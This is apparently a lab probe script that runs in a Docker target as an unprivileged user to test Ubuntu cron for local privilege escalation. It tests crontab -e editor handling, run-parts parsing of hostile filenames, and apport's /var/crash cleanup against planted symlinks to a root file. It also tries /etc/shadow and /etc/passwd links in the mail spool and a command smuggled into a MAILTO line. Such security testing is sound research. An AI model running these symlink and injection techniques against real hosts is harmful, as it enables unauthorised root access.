#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
tag="${TAG:-CRONMAIL_$(date -u +%Y%m%d%H%M%S)_$$}"

docker exec -i -e TAG="$tag" "$container" bash <<'INCONTAINER'
set -Eeuo pipefail
export LC_ALL=C

TAG="${TAG:?missing TAG}"
BASE="/home/attacker/${TAG}"
ROOT_DECOY="/root/${TAG}_root_decoy"
ROOT_PROOF="/root/${TAG}_root_proof"
START_UTC="$(date -u '+%Y-%m-%d %H:%M:%S')"

section() {
  printf '\n== %s ==\n' "$*"
}

as_attacker() {
  runuser -u attacker -- env TAG="$TAG" BASE="$BASE" ROOT_DECOY="$ROOT_DECOY" ROOT_PROOF="$ROOT_PROOF" bash -lc "$*"
}

show_path() {
  local p
  for p in "$@"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -Lc 'follow %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "$p" 2>&1 || true
      stat -c 'nofollow %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s -> %N' "$p" 2>&1 || true
      if [ -f "$p" ] && [ ! -L "$p" ] && [ "$(stat -c %s "$p" 2>/dev/null || echo 999999)" -lt 8192 ] && grep -Iq . "$p"; then
        printf 'content %s: ' "$p"
        sed -n '1,3p' "$p" 2>/dev/null || true
      fi
    else
      printf 'missing %s\n' "$p"
    fi
  done
}

cleanup() {
  set +e
  runuser -u attacker -- crontab -r >/dev/null 2>&1 || true
  rm -rf "$BASE"
  rm -f /tmp/"${TAG}"* /var/tmp/"${TAG}"*
  rm -f /var/crash/"${TAG}"_old_file /var/crash/"${TAG}"_new_file /var/crash/"${TAG}"_root_link
  rm -rf /var/crash/123456789012
  rm -f /var/mail/"${TAG}"* /var/spool/mail/"${TAG}"*
  rm -f "$ROOT_DECOY" "$ROOT_PROOF"
}
trap cleanup EXIT INT TERM

cleanup
install -d -o attacker -g attacker -m 0755 "$BASE"
printf 'root-decoy-keep\n' > "$ROOT_DECOY"
chmod 0644 "$ROOT_DECOY"

section "target, package, and default enabled proof"
cat /etc/os-release | sed -n 's/^\(PRETTY_NAME\|VERSION_ID\|VERSION_CODENAME\)=/\1=/p'
uname -a
id attacker
printf 'attacker_groups='
id -nG attacker
getent group crontab mail || true
for p in cron cron-daemon-common debianutils systemd apport apt dpkg logrotate man-db sysstat e2fsprogs anacron at bsd-mailx mailutils postfix exim4-daemon-light nullmailer msmtp-mta; do
  if dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$p" 2>/dev/null; then
    :
  else
    printf '%s\tNOT_INSTALLED\n' "$p"
  fi
done
printf 'run-parts_version='
run-parts --version 2>&1 | sed -n '1p'
printf 'cron_enabled='
systemctl is-enabled cron.service || true
printf 'cron_active='
systemctl is-active cron.service || true
systemctl status cron.service --no-pager -l | sed -n '1,12p' || true
printf 'system_state='
systemctl is-system-running || true
systemctl list-unit-files --no-pager | egrep '^(cron|anacron|atd|apt-daily|logrotate|man-db|sysstat)' || true
systemctl list-timers --all --no-pager | egrep 'cron|anacron|atd|apt|logrotate|man-db|sysstat' || true

section "helper locations, modes, groups, and absence proof"
for c in cron crontab run-parts anacron at atd sendmail mail mailx; do
  printf '%s -> ' "$c"
  command -v "$c" 2>/dev/null || true
done
for p in /usr/sbin/cron /usr/bin/crontab /usr/bin/run-parts /usr/sbin/anacron /usr/bin/at /usr/sbin/atd /usr/sbin/sendmail /usr/lib/sendmail /usr/bin/mail /usr/bin/mailx /etc/crontab /etc/cron.d /etc/cron.daily /etc/cron.weekly /var/spool/cron /var/spool/cron/crontabs /var/mail /var/spool/mail; do
  show_path "$p"
done
sed -n '1,80p' /etc/crontab
systemctl cat cron.service 2>/dev/null | sed -n '1,80p'
cat /proc/1/environ | tr '\0' '\n' | grep '^PATH=' || true
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos 2>/dev/null || true

section "setgid crontab and spool traversal residual checks"
as_attacker '
set +e
printf "attacker_id: "; id
printf "direct_spool_ls: "
ls -la /var/spool/cron/crontabs 2>&1
printf "rc=%s\n" "$?"
printf "* * * * * id > /tmp/${TAG}_attacker_cron_id\n" > "$BASE/ctab"
crontab "$BASE/ctab"
printf "crontab_l:\n"
crontab -l
printf "direct_cat_own_spool: "
cat /var/spool/cron/crontabs/attacker 2>&1
printf "rc=%s\n" "$?"
cat > "$BASE/editor.sh" <<EOF
#!/bin/sh
id > /tmp/${TAG}_editor_id
awk "/^(Uid|Gid|Groups|NoNewPrivs):/ {print}" /proc/\$\$/status >> /tmp/${TAG}_editor_id
exit 1
EOF
chmod 755 "$BASE/editor.sh"
VISUAL="$BASE/editor.sh" EDITOR="$BASE/editor.sh" crontab -e >/tmp/${TAG}_crontab_e.out 2>/tmp/${TAG}_crontab_e.err
printf "crontab_e_rc=%s\n" "$?"
cat /tmp/${TAG}_crontab_e.err
cat /tmp/${TAG}_editor_id
'
show_path /var/spool/cron/crontabs/attacker /tmp/"${TAG}"_editor_id

section "run-parts default filename and path parsing"
install -d -o attacker -g attacker -m 0755 "$BASE/runparts"
as_attacker '
set -e
cd "$BASE/runparts"
for name in 00ok alpha_beta alpha-beta --dash --report README evil.sh "evil space" ".hidden" "plus+name" "tilde~" "colon:name"; do
  printf "#!/bin/sh\nprintf \"ran:%s uid=\$(id -u) gid=\$(id -g) args=\\\$* pwd=\$(pwd)\\\\n\"\n" "$name" > "$name"
  chmod 755 -- "$name"
done
printf "#!/bin/sh\nprintf \"ran:newline uid=\$(id -u)\\\\n\"\n" > "line
break"
chmod 755 -- "line
break"
find "$BASE/runparts" -maxdepth 1 -mindepth 1 -printf "%f mode=%m owner=%u:%g\n" | sort
'
printf '%s\n' '-- run-parts --test'
run-parts --test "$BASE/runparts" 2>&1 | sed -n '1,120p'
printf '%s\n' '-- run-parts --list'
run-parts --list "$BASE/runparts" 2>&1 | sed -n '1,120p'
printf '%s\n' '-- run-parts --debug'
run-parts --debug "$BASE/runparts" 2>&1 | sed -n '1,180p'
printf '%s\n' '-- run-parts --report execution'
run-parts --report "$BASE/runparts" 2>&1 | sed -n '1,160p'
printf '%s\n' '-- default cron run-parts targets'
find /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.yearly -maxdepth 1 -mindepth 1 -printf '%M %u:%g %p -> %l\n' | sort
as_attacker '
set +e
for p in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.yearly /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin; do
  printf "write_test %s: " "$p"
  touch "$p/${TAG}_write_test" 2>&1 && rm -f "$p/${TAG}_write_test" && echo WRITABLE || echo NO
done
'

section "cron.d and cron.daily scripts with user-owned input review"
for f in /etc/cron.d/* /etc/cron.daily/* /etc/cron.weekly/*; do
  [ -e "$f" ] || continue
  printf '\n-- %s --\n' "$f"
  stat -Lc '%A %U:%G %n' "$f"
  sed -n '1,140p' "$f"
done
printf '\n-- grep user-writable/input-looking paths --\n'
grep -RInE '/home|/tmp|/var/tmp|/var/crash|/var/mail|/var/spool|/run/user|find |rm -R|run-parts|PATH=|command -v|^[[:space:]]*cd ' /etc/cron.d /etc/cron.daily /etc/cron.weekly 2>/dev/null || true
for p in /var/crash /var/cache/man /var/log/sysstat /var/log /var/lib/dpkg /var/cache/apt /etc/default/sysstat /usr/lib/sysstat /usr/lib/aarch64-linux-gnu/e2fsprogs; do
  show_path "$p"
done

section "apport cron.daily user-owned /var/crash cleanup symlink and directory probe"
show_path /etc/cron.daily/apport /var/crash "$ROOT_DECOY"
as_attacker '
set -e
printf old > /var/crash/${TAG}_old_file
printf new > /var/crash/${TAG}_new_file
ln -s "$ROOT_DECOY" /var/crash/${TAG}_root_link
mkdir -p /var/crash/123456789012/nested
printf nested > /var/crash/123456789012/nested/user_file
ln -s "$ROOT_DECOY" /var/crash/123456789012/nested/root_link
touch -d "9 days ago" /var/crash/${TAG}_old_file /var/crash/${TAG}_root_link /var/crash/123456789012 /var/crash/123456789012/nested /var/crash/123456789012/nested/user_file 2>/dev/null || true
find /var/crash -maxdepth 3 \( -name "${TAG}_*" -o -name 123456789012 \) -printf "%M %u:%g %p -> %l\n" | sort
'
printf '%s\n' '-- running /etc/cron.daily/apport as the root cron job would'
/etc/cron.daily/apport || true
find /var/crash -maxdepth 3 \( -name "${TAG}_*" -o -name 123456789012 \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null | sort || true
show_path "$ROOT_DECOY"

section "MAILTO, MTA absence, and mail spool behavior"
for p in /usr/sbin/sendmail /usr/lib/sendmail /usr/bin/mail /usr/bin/mailx /var/mail /var/spool/mail; do
  show_path "$p"
done
find /var/mail /var/spool/mail -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
as_attacker '
set +e
for cmd in \
  "touch /var/mail/${TAG}_touch" \
  "touch /var/mail/root" \
  "ln -s /etc/shadow /var/mail/${TAG}_shadow_link" \
  "ln /etc/passwd /var/mail/${TAG}_passwd_hard" \
  "touch /var/spool/mail/${TAG}_touch" \
  "ln -s /etc/shadow /var/spool/mail/${TAG}_shadow_link"; do
    printf "$ %s\n" "$cmd"
    bash -lc "$cmd" 2>&1
    printf "rc=%s\n" "$?"
done
cat > "$BASE/mail_cron" <<EOF
SHELL=/bin/sh
MAILTO=root
* * * * * echo ${TAG}_SAFE_MAIL_OUTPUT; id > /tmp/${TAG}_safe_mail_job_id
MAILTO=root;touch /tmp/${TAG}_mailto_shell
* * * * * echo ${TAG}_UNSAFE_MAIL_OUTPUT; id > /tmp/${TAG}_unsafe_mail_job_id
EOF
crontab "$BASE/mail_cron"
crontab -l
'
before_mail_listing="$(find /var/mail /var/spool/mail -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort)"
sec="$(date +%S)"
sec=$((10#$sec))
sleep_for=$((70 - sec))
if [ "$sleep_for" -lt 20 ]; then
  sleep_for=$((sleep_for + 60))
fi
printf 'sleep_for_cron_mail=%s\n' "$sleep_for"
sleep "$sleep_for"
printf '%s\n' '-- mail listing before'
printf '%s\n' "$before_mail_listing"
printf '%s\n' '-- mail listing after'
find /var/mail /var/spool/mail -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
show_path /tmp/"${TAG}"_mailto_shell /tmp/"${TAG}"_safe_mail_job_id /tmp/"${TAG}"_unsafe_mail_job_id "$ROOT_PROOF"
journalctl -u cron.service --since "$START_UTC UTC" --no-pager -o short-iso | grep -E "$TAG|No MTA|CRON|WRONG|INSECURE|CAN.T OPEN" | tail -n 120 || true

section "anacron and at absence/reachability proof"
for p in /usr/sbin/anacron /usr/bin/at /usr/bin/atq /usr/bin/atrm /usr/sbin/atd /etc/anacrontab /var/spool/cron/atjobs /var/spool/cron/atspool; do
  show_path "$p"
done
systemctl status anacron.service atd.service --no-pager -l 2>&1 | sed -n '1,120p' || true
as_attacker '
set +e
printf "id > /tmp/${TAG}_at_job\n" | at now 2>&1
printf "at_rc=%s\n" "$?"
'
show_path /tmp/"${TAG}"_at_job

section "root proof and cleanup"
if [ -s "$ROOT_PROOF" ]; then
  printf 'ROOT_PROOF=YES\n'
  sed -n '1,20p' "$ROOT_PROOF"
else
  printf 'ROOT_PROOF=NO\n'
fi
show_path "$ROOT_DECOY"
cleanup
printf 'post_cleanup_leftovers=\n'
find /tmp /var/tmp /var/crash /var/mail /var/spool/mail -maxdepth 2 \( -name "${TAG}*" -o -lname "*${TAG}*" \) -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
printf 'attacker_crontab_after_cleanup='
runuser -u attacker -- crontab -l 2>&1 || true
printf 'system_state_after='
systemctl is-system-running || true
systemctl --failed --no-pager || true
INCONTAINER
